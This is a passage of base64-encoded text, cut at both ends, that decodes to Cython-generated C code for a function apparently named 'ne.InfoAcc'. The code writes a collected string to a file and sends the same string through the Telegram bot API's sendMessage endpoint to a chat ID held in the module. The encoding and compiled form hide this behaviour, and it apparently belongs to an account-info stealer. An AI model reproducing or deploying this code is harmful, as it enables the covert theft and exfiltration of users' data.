NIQVJfVkFMVUUoX19weXhfdF8xOCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xOSkpOwogIGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCAyNTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICBfX3B5eF92X3NzID0gKChQeU9iamVjdCopX19weXhfdF8yMSk7CiAgX19weXhfdF8yMSA9IDA7CgogIAogICB7CiAgICBfX3B5eF90XzIxID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgMjc0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzIxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW5jb2RpbmcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXRmXzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjc0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X2J1aWx0aW5fb3BlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdLCBfX3B5eF90XzIxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDI3NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzE5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDI3NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgIF9fcHl4X3RfMTggPSBOVUxMOwogICAgX19weXhfdF8xNyA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDI3NCwgX19weXhfTDE3X2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpOwogICAgX19weXhfdF81ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmIChsaWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xNykpKSB7CiAgICAgIF9fcHl4X3RfMTggPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzE3KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfMTgpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTcpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xOCk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTcsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTgsIE5VTEx9OwogICAgICBfX3B5eF90XzIxID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xNywgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCAyNzQsIF9fcHl4X0wxN19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjEpOwogICAgfQogICAgX19weXhfdF8xNyA9IF9fcHl4X3RfMjE7CiAgICBfX3B5eF90XzIxID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgewogICAgICB7CiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzcsICZfX3B5eF90XzYsICZfX3B5eF90XzIyKTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMik7CiAgICAgICAgIHsKICAgICAgICAgIF9fcHl4X3ZfZmlsZSA9IF9fcHl4X3RfMTc7CiAgICAgICAgICBfX3B5eF90XzE3ID0gMDsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfMTkgPSBfX3B5eF92X2ZpbGU7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICBfX3B5eF90XzIxID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdChfX3B5eF92X3NzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDI3NSwgX19weXhfTDIxX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjEpOwogICAgICAgICAgX19weXhfdF81ID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTksIF9fcHl4X3RfMjF9OwogICAgICAgICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dyaXRlLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAyNzUsIF9fcHl4X0wyMV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKCiAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjIpOyBfX3B5eF90XzIyID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0wyNl90cnlfZW5kOwogICAgICAgIF9fcHl4X0wyMV9lcnJvcjo7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICB7CiAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTcsICZfX3B5eF90XzIxLCAmX19weXhfdF8xOSkgPCAwKSBfX1BZWF9FUlIoMCwgMjc0LCBfX3B5eF9MMjNfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgX19weXhfdF8xOCA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzE3LCBfX3B5eF90XzIxLCBfX3B5eF90XzE5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE4KSkgX19QWVhfRVJSKDAsIDI3NCwgX19weXhfTDIzX2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTsKICAgICAgICAgIF9fcHl4X3RfMjMgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfOCwgX19weXhfdF8xOCwgTlVMTCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjMpKSBfX1BZWF9FUlIoMCwgMjc0LCBfX3B5eF9MMjNfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjMpOwogICAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMjMpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjMpOyBfX3B5eF90XzIzID0gMDsKICAgICAgICAgIGlmIChfX3B5eF90XzkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNzQsIF9fcHl4X0wyM19leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX3B5eF90XzEwID0gKCFfX3B5eF90XzkpOwogICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTApKSB7CiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfMTcsIF9fcHl4X3RfMjEsIF9fcHl4X3RfMTkpOwogICAgICAgICAgICBfX3B5eF90XzE3ID0gMDsgIF9fcHl4X3RfMjEgPSAwOyAgX19weXhfdF8xOSA9IDA7IAogICAgICAgICAgICBfX1BZWF9FUlIoMCwgMjc0LCBfX3B5eF9MMjNfZXhjZXB0X2Vycm9yKQogICAgICAgICAgfQogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwOwogICAgICAgICAgZ290byBfX3B5eF9MMjJfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0wyM19leGNlcHRfZXJyb3I6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTsKICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfNiwgX19weXhfdF8yMik7CiAgICAgICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgICAgICBfX3B5eF9MMjJfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTsKICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfNiwgX19weXhfdF8yMik7CiAgICAgICAgX19weXhfTDI2X3RyeV9lbmQ6OwogICAgICB9CiAgICB9CiAgICAgewogICAgICB7CiAgICAgICAgaWYgKF9fcHl4X3RfOCkgewogICAgICAgICAgX19weXhfdF8yMiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs1XSwgTlVMTCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yMikpIF9fUFlYX0VSUigwLCAyNzQsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjIpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjIpOyBfX3B5eF90XzIyID0gMDsKICAgICAgICB9CiAgICAgICAgZ290byBfX3B5eF9MMjA7CiAgICAgIH0KICAgICAgX19weXhfTDIwOjsKICAgIH0KICAgIGdvdG8gX19weXhfTDMwOwogICAgX19weXhfTDE3X2Vycm9yOjsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0wzMDo7CiAgfQoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzIyLCAmX19weXhfdF82KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7CiAgICAgewoKICAgICAgCiAgICAgIHsKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfMjMsICZfX3B5eF90XzI0KTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIzKTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjQpOwogICAgICAgICB7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzIxID0gTlVMTDsKICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDI3OCwgX19weXhfTDM3X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpOwogICAgICAgICAgX19weXhfdF8xOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCAyNzgsIF9fcHl4X0wzN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Ub2tlbik7IGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAyNzksIF9fcHl4X0wzN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNikpIF9fUFlYX0VSUigwLCAyNzksIF9fcHl4X0wzN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JRCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAyNzksIF9fcHl4X0wzN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgIF9fcHl4X3RfMTUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNSkpIF9fUFlYX0VSUigwLCAyNzksIF9fcHl4X0wzN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgICAgICBfX3B5eF90XzI1WzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hcGlfdGVsZWdyYW1fb3JnX2JvdDsKICAgICAgICAgIF9fcHl4X3RfMjVbMV0gPSBfX3B5eF90XzE2OwogICAgICAgICAgX19weXhfdF8yNVsyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2VuZE1lc3NhZ2VfY2hhdF9pZDsKICAgICAgICAgIF9fcHl4X3RfMjVbM10gPSBfX3B5eF90XzE1OwogICAgICAgICAgX19weXhfdF8yNVs0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdGV4dF8yOwogICAgICAgICAgX19weXhfdF8yNVs1XSA9IF9fcHl4X3Zfc3M7CiAgICAgICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8yNSwgNiwgMjggKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE2KSArIDIxICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xNSkgKyA2ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdl9zcyksIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzE2KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzE1KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF92X3NzKSk7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMjc5LCBfX3B5eF9MMzdfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgIF9fcHl4X3RfNSA9IDE7CiAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xOCkpKSB7CiAgICAgICAgICAgIF9fcHl4X3RfMjEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzE4KTsKICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMjEpOwogICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTgpOwogICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yMSk7CiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTgsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICB9CiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMjEsIF9fcHl4X3RfMTd9OwogICAgICAgICAgICBfX3B5eF90XzE5ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xOCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAyNzgsIF9fcHl4X0wzN19lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKCiAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMyk7IF9fcHl4X3RfMjMgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yNCk7IF9fcHl4X3RfMjQgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDQyX3RyeV9lbmQ7CiAgICAgICAgX19weXhfTDM3X2Vycm9yOjsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfMjYgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICAgICAgaWYgKF9fcHl4X3RfMjYpIHsKICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygibmUuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2V